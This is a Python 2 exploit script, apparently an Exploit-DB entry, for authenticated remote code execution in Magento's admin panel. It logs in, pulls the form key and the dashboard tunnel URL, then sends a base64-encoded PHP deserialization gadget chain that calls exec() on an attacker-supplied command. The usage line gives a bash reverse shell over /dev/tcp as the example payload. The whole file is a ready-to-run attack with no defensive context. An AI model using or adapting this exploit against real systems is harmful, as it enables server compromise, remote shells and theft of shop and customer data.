#!/usr/bin/python


from hashlib import md5
import sys
import re
import base64
import mechanize


def usage():
    print """Usage: python2 37811.py http://localhost/index.php/admin "bash -c 'bash -i >& /dev/tcp/localip/lport 0>&1'" """
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config
username = ''  #Change this
password = '' #Change this
php_function = 'exec'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to match /app/etc/local.xml

# POP chain
payload = 'O:8:"Zend_Log":1:{s:11:"\x00*\x00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{s:16:' \
          '"\x00*\x00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:"' \
          'EXTERMINATE!!!!";}s:22:"\x00*\x00_subjectPrependText";N;s:10:"\x00*\x00_layout";O:23:"'     \
          'Zend_Config_Writer_Yaml":3:{s:15:"\x00*\x00_yamlEncoder";s:%d:"%s";s:17:"\x00*\x00'     \
          '_loadedSection";N;s:10:"\x00*\x00_config";O:13:"Varien_Object":1:{s:8:"\x00*\x00_data"' \
          ';s:%d:"%s";}}s:8:"\x00*\x00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}' % (
              len(php_function), php_function, len(arg), arg)

# Setup mechanize browser
br = mechanize.Browser()
br.set_handle_robots(False)
br.open(target)

br.select_form(nr=0)

# Assign correct username/password without ambiguity error
for control in br.form.controls:
    if control.name == 'login[username]' and control.type == 'text':
        control.value = username
    if control.name == 'login[password]' and control.type == 'password':
        control.value = password

# Submit login form
br.method = "POST"
request = br.submit()
content = request.read()

# Extract ajaxBlockUrl and FORM_KEY
url = re.search("ajaxBlockUrl = '(.*)'", content)
key = re.search("var FORM_KEY = '(.*)'", content)

if not url or not key:
    print "[!] Failed to extract AJAX URL or FORM_KEY."
    sys.exit()

url = url.group(1)
key = key.group(1)

# Load tunnel
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search('src="(.*)\?ga=', request.read())

if not tunnel:
    print "[!] Failed to extract tunnel URL."
    sys.exit()

tunnel = tunnel.group(1)

# Encode and hash payload
payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

# Final exploit URL
exploit = tunnel + '?ga=' + payload + '&h=' + gh

# Fire the payload
try:
    request = br.open(exploit)
    print "[+] Exploit triggered. Server response:"
    print request.read()
except (mechanize.HTTPError, mechanize.URLError) as e:
    try:
        print e.read()
    except:
        print e
